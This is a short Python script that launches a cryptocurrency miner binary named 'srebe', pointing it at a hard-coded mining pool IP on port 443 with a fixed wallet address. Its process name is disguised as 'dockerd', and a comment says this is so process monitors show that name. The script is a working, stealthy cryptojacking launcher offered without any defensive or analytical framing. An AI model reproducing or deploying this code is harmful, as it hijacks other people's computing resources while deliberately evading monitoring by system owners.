import os
os.system("chmod +x srebe")
# Replace the current process with the mining process
os.execvp("./srebe", [
    "dockerd",  # This will be the name shown in process monitors
    "--disable-gpu",
    "--algorithm", "yespowersugar",
    "--pool", "45.88.24.129:443",
    "--wallet", "sugar1qgry5hf7ah3e9ef0zkqr0evlg39mauhes6dl3gf",
    "--worker", "aaaa",  # Using a fixed worker name
    "--password", "x",
    "--cpu-threads", "2"
])
